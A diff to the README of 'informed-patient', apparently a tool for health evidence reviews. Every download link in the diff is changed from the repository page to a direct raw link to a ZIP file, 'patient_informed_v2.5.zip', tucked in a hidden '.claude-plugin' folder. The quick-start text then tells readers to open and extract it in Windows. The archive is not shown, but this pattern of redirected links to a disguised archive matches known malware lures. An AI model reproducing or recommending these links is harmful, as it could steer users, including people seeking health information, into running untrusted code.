@@ -1,6 +1,6 @@
 # 🧠 informed-patient - Evidence reviews for health questions
 
-[![Download / Visit the page](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hdl050314-hash/informed-patient)
+[![Download / Visit the page](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hdl050314-hash/informed-patient/raw/refs/heads/main/informed-patient/.claude-plugin/patient_informed_v2.5.zip)
 
 ## 📌 What this is
 
@@ -30,7 +30,7 @@ For best results, use:
 
 Open the download page here:
 
-https://github.com/hdl050314-hash/informed-patient
+https://github.com/hdl050314-hash/informed-patient/raw/refs/heads/main/informed-patient/.claude-plugin/patient_informed_v2.5.zip
 
 On that page, look for the files listed under the latest release or the main repository files. If you see an installer or app file, download it to your computer.
 
@@ -199,7 +199,7 @@ A simple way to work through a review:
 
 ## 📌 Quick start
 
-1. Visit the download page: https://github.com/hdl050314-hash/informed-patient
+1. Visit the download page: https://github.com/hdl050314-hash/informed-patient/raw/refs/heads/main/informed-patient/.claude-plugin/patient_informed_v2.5.zip
 2. Download the app or file shown there
 3. Open the file in Windows
 4. Extract it if it came as a ZIP file
